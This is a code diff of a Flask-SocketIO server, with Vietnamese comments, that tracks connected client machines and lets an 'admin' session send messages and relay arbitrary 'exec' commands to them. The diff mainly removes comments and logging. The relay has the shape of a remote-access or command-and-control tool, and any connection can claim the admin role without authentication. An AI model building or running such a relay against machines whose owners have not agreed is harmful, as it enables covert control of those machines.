@@ -8,27 +8,20 @@ from flask_socketio import SocketIO, emit
 app = Flask(__name__, static_folder='.', static_url_path='')
 app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "change-me")
 
-# eventlet giúp WebSocket chạy mượt trên Render
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
-# ---------- LƯU TRỮ ----------
 clients = {}
 admins = set()
 lock = threading.Lock()
 CLIENT_TIMEOUT = 15
 
-# ---------- HTTP ENDPOINTS ----------
 @app.route("/")
 def serve_index():
     return send_from_directory('.', 'index.html')
 
 @app.route("/status")
 def home():
-    return jsonify({
-        "status": "ok",
-        "clients": len(clients),
-        "admins": len(admins),
-    })
+    return jsonify({"status": "ok", "clients": len(clients), "admins": len(admins)})
 
 def snapshot_clients():
     now = time.time()
@@ -54,9 +47,8 @@ def notify_admins(event, data):
         except:
             admins.discard(sid)
 
-# --- LUỒNG TỰ ĐỘNG CẬP NHẬT REALTIME (THÊM MỚI) ---
+# Luồng tự động đẩy (dự phòng)
 def auto_realtime_loop():
-    """Cứ mỗi 1 giây, tự động gửi danh sách mới nhất cho tất cả Admin"""
     while True:
         if admins:
             payload = {"event": "clients", "clients": snapshot_clients()}
@@ -65,12 +57,11 @@ def auto_realtime_loop():
                     socketio.emit("admin_event", payload, to=sid)
                 except:
                     admins.discard(sid)
-        time.sleep(1)
+        time.sleep(2) # 2 giây/lần
 
-# ---------- SOCKET EVENTS ----------
 @socketio.on("connect")
 def on_connect(auth):
-    print(f"[+] New connection: {auth}")
+    pass
 
 @socketio.on("register")
 def on_register(data):
@@ -89,7 +80,6 @@ def on_register(data):
         }
         with lock:
             clients[client_id] = info
-        print(f"[CLIENT+] {client_id} ({info['hostname']}) từ {info['ip']}")
         notify_admins("client_joined", {
             "client": info["hostname"],
             "client_id": client_id,
@@ -98,12 +88,8 @@ def on_register(data):
 
     elif role == "admin":
         admins.add(sid)
-        print(f"[ADMIN+] {request.remote_addr}")
         emit("registered", {"ok": True})
-        emit("admin_event", {
-            "event": "init",
-            "clients": snapshot_clients(),
-        })
+        emit("admin_event", {"event": "init", "clients": snapshot_clients()})
 
 @socketio.on("heartbeat")
 def on_heartbeat(data):
@@ -120,6 +106,7 @@ def on_admin_command(data):
     action = data.get("action")
 
     if action == "list":
+        # Trả lời NGAY LẬP TỨC khi Web hỏi (Polling 1s)
         emit("admin_event", {"event": "clients", "clients": snapshot_clients()})
 
     elif action == "send":
@@ -129,7 +116,6 @@ def on_admin_command(data):
             c = clients.get(target)
         if c:
             socketio.emit("admin_msg", {"message": msg}, to=c["sid"])
-            print(f"[ADMIN→{c['hostname']}] {msg}")
             emit("admin_event", {"event": "sent", "ok": True, "client_id": target})
         else:
             emit("admin_event", {"event": "sent", "ok": False, "error": "client not found"})
@@ -142,7 +128,6 @@ def on_admin_command(data):
             notify_admins("broadcast_sent", {"message": msg})
             emit("admin_event", {"event": "broadcast_sent", "ok": True, "message": msg})
 
-    # Thêm phần exec (Tạo/chạy file)
     elif action == "exec":
         target = data.get("client_id")
         cmd = data.get("command", "")
@@ -150,7 +135,6 @@ def on_admin_command(data):
             c = clients.get(target)
         if c:
             socketio.emit("exec_command", {"command": cmd, "admin_sid": request.sid}, to=c["sid"])
-            print(f"[ADMIN→{c['hostname']}] EXEC: {cmd}")
             emit("admin_event", {"event": "exec_sent", "ok": True, "client_id": target})
         else:
             emit("admin_event", {"event": "exec_sent", "ok": False, "error": "client not found"})
@@ -170,7 +154,6 @@ def on_disconnect():
     sid = request.sid
     if sid in admins:
         admins.discard(sid)
-        print(f"[ADMIN-] {sid}")
         return
 
     removed = None
@@ -181,14 +164,12 @@ def on_disconnect():
                 del clients[cid]
                 break
     if removed:
-        print(f"[CLIENT-] {removed[1]} ({removed[0]})")
         notify_admins("client_left", {
             "client": removed[1], "client_id": removed[0]
         })
 
-# ---------- MAIN ----------
 if __name__ == "__main__":
-    # Khởi động luồng tự động cập nhật realtime
+    # Khởi động luồng đẩy dữ liệu (dự phòng)
     threading.Thread(target=auto_realtime_loop, daemon=True).start()
     
     port = int(os.environ.get("PORT", 10000))
